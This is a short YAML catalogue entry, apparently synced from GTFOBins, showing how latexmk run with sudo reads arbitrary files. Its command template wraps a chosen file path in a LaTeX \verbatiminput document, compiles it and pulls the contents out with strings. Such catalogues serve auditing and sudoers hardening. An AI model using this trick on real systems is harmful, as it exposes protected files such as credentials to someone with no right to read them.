id: gtfobins/latexmk/file-read/sudo
type: binary
platform: linux
name: latexmk
phases:
- collection
- privilege-escalation
capabilities:
- file-read
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'echo ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''
    >/path/to/temp-file

    latexmk -dvi /path/to/temp-file

    strings temp-file.dvi'
  comment: The read file will be part of the output.
references:
- https://gtfobins.github.io/gtfobins/latexmk/
tags:
- linux
- unix
- gtfobins
